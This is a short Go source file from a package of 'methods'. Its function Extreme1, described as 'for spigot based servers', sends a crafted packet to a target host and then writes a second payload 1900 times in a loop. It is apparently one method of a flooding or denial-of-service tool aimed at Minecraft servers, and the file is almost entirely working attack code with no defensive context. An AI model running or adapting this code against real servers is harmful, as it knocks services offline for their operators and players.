package methods

import (
	"fmt"
	"net"
)

//Extreme1 is for spigot based servers
func Extreme1(data *Data, out net.Conn) bool {
	if data.bytes == nil {
		data.supplyBytes(makeBytes(15, 0, 99, 453, data.Host, 457, 1))
	}

	_, err := out.Write(data.bytes)

	if err != nil {
		return true
	}

	fmt.Println("sent")

	for n := 0; n < 1900; n++ {
		out.Write(data.minorBytes)
	}

	return false
}
